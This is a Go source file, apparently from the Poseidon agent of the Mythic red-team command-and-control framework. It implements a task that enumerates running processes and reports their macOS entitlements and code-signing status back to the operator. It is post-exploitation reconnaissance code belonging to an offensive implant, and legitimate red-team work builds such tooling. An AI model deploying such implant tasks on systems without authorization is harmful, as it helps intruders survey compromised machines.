package list_entitlements

import (
	// Standard
	"encoding/json"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
)

type Arguments struct {
	PID int
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["pid"]; ok {
		e.PID = int(v.(float64))
	}
	return nil
}

type ProcessDetails struct {
	ProcessID    int
	Entitlements map[string]interface{}
	Name         string
	BinPath      string
	CodeSign     int
}

func (e ProcessDetails) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"process_id":   e.ProcessID,
		"entitlements": e.Entitlements,
		"name":         e.Name,
		"bin_path":     e.BinPath,
		"code_sign":    e.CodeSign,
	}
	return json.Marshal(alias)
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	var final string
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if args.PID < 0 {
		procs, _ := ps.Processes()
		p := make([]ProcessDetails, len(procs))
		for index := 0; index < len(procs); index++ {
			p[index].ProcessID = procs[index].Pid()
			p[index].Name = procs[index].Name()
			p[index].BinPath = procs[index].BinPath()
			ent, _ := listEntitlements(p[index].ProcessID)
			if ent.Successful {
				err := json.Unmarshal([]byte(ent.Message), &p[index].Entitlements)
				if err != nil {
					p[index].Entitlements = map[string]interface{}{"error": err.Error()}
				}
			} else {
				p[index].Entitlements = map[string]interface{}{"error": "Unable to parse"}
			}
			cs, _ := listCodeSign(p[index].ProcessID)
			p[index].CodeSign = cs.CodeSign
		}
		temp, _ := json.Marshal(p)
		final = string(temp)
	} else {
		r, _ := listEntitlements(args.PID)
		if !r.Successful {
			msg.Status = "error"
		}
		final = r.Message
	}

	msg.Completed = true
	msg.UserOutput = final
	task.Job.SendResponses <- msg
	return
}
